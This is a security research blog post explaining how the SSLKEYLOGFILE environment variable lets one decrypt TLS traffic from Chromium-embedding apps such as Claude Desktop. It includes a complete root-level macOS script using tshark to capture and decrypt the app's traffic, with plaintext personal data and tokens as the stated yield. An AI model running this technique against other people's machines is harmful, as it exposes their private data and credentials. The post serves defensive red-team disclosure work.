# The dangers of SSLKEYLOGFILE
Today I accidently discovered a minor issue in [Claude Desktop](http://claude.ai) - I installed it on a Windows VM I knew I used for internal testing of certain redteaming capabilities.  
Surprisingly, I discovered there is an open handle to a file `C:\temp\secret.key` - what magic is this?  
Digging deeper, I realized I left the VM in an unclean state - I had an environment variable called `SSLKEYLOGFILE` set to that path.

## SSLKEYLOGFILE and its implications
The `SSLKEYLOGFILE` is used in browsers like [Chrome](https://www.google.com/chrome) and [Firefox](https://www.firefox.com) to write TLS\SSL session keys into a file.  
You can simply set that environment variable to a path of your choosing and per-session keys will be written there!  
The output of that file would look like similar to this:

```
CLIENT_HANDSHAKE_TRAFFIC_SECRET 53a0ac6f20f59bd3cd859f27fc45061e05b7edcccbce6b1370cb1a829f96bab0 f433dbf9ab4967f6a48777563370e02bf4909259e578fe66f20a6bf697b347da
SERVER_HANDSHAKE_TRAFFIC_SECRET 53a0ac6f20f59bd3cd859f27fc45061e05b7edcccbce6b1370cb1a829f96bab0 26a10bc2694de64b76d5dbd27ef03607ed546803c0074e9e3a609a866cac25e9
CLIENT_TRAFFIC_SECRET_0 53a0ac6f20f59bd3cd859f27fc45061e05b7edcccbce6b1370cb1a829f96bab0 396a555537bd80495e92b3b330c99e068e610b857681bb301e0e26c408708db6
SERVER_TRAFFIC_SECRET_0 53a0ac6f20f59bd3cd859f27fc45061e05b7edcccbce6b1370cb1a829f96bab0 0ae666ba538f2472a9714fdcb68ee05c7d42c4f0552691263d9ff84963ea1a24
EXPORTER_SECRET 53a0ac6f20f59bd3cd859f27fc45061e05b7edcccbce6b1370cb1a829f96bab0 d20b772c938f61fde276c9e61a9e9e9203adf71389f7a00c25b2c589aadce248
CLIENT_HANDSHAKE_TRAFFIC_SECRET ee5743c72e4991a464d37cb4e66f310451bfe07e09aafd28a056a666148b08c4 a4115251e27a6d05ff9f49a1ef472a860250b8fea459df0f61900e62af06f07a
SERVER_HANDSHAKE_TRAFFIC_SECRET ee5743c72e4991a464d37cb4e66f310451bfe07e09aafd28a056a666148b08c4 48bc8e933fbb4e78772b34f238fbe9cd22120893528f4960803fe53aeb3423a7
```

In environments like Windows it's not that interesting, since [process injection and hooking](https://github.com/yo-yo-yo-jbo/injection_and_hooking_intro/) are so easy to accomplish.  
However, on macOS things are different - and injection is not common at all (due to hardened runtime, AMFI and other mechanisms).  
Also, since Claude embeds a browser in it ([Chromium](https://www.chromium.org)) - it (and other Apps, e.g. built with [Electron](https://www.electronjs.org)) are susceptible.

## How to utilize SSLKEYLOGFILE for SSL stripping
I will attach a complete script here for macOS, I will also be relying on [tshark](https://tshark.dev/setup/install/) to do the heavyweight lifting:
1. From root, I will start sniffing using `tshark`.
2. I will use the `open` command with `--env` to set Claude's `SSLKEYLOGFILE` environment variable.
3. Once Claude is done, we will stop `tshark`'s sniffing.
4. We use `tshark` again, with the `-o tls.keylog_file` option and see plaintext bytes.

Here is the complete script:
```shell
#!/bin/bash

# Fine-tunables
INTERFACE=en0
PCAP_PATH=/tmp/claudump.pcap
KEY_PATH=/tmp/claudump.key

# Variables
TSHARK_PID=0

# Check tshark exists
if ! command -v tshark >/dev/null 2>&1; then
    echo "[-] Error: tshark is not installed."
    exit 1
fi

# Check for root
if [ "$(id -u)" -ne 0 ]; then
    echo "[-] Error: this script must be run as root or with sudo."
    exit 1
fi

# Start sniffing
echo "[+] Sniffing over interface $INTERFACE"
tshark -i $INTERFACE -w "$PCAP_PATH" &
TSHARK_PID=$!

# Cleanup routine
cleanup() {
    if [ "$TSHARK_PID" -ne 0 ]; then
        echo "[+] Stopping tshark..."
        kill "$TSHARK_PID" 2>/dev/null || true
        TSHARK_PID=0
    fi
    echo "[+] Cleaning up temporary files..."
    rm -f "$PCAP_PATH"
    rm -f "$KEY_PATH"
}
trap cleanup EXIT

# Running Claude Desktop with the SSLKEYLOGFILE environment variable
echo "[+] Opening Claude - please work on it and when done - press any key"
open --env SSLKEYLOGFILE=$KEY_PATH -a Claude
echo "[!] PRESS ANY KEY TO CONTINUE"
read -n 1 -s

# Stop tshark
echo "[+] Stopping tshark..."
kill "$TSHARK_PID" 2>/dev/null || true
TSHARK_PID=0

# Decrypt
echo "[+] Decrypting contents"
tshark -r "$PCAP_PATH" -o "tls.keylog_file:$KEY_PATH" "-V" 
echo "[!] PRESS ANY KEY TO CONTINUE"
read -n 1 -s
```

## Implications and summary
You can do that technique on every major OS to capture interesting things from anything that embeds a web browser (as I mentioned).  
What can you get?
- Plaintext personal data
- Tokens

I note this was not deemed as a vulnerability by Claude, and probably it shouldn't - but I think it's an important idea for Red teams.  
I do, however, think, that in production code - there's no need for `SSLKEYLOGFILE` types of environment variables, thus I reached out to Claude anyway.

Stay tuned!

Jonathan Bar Or
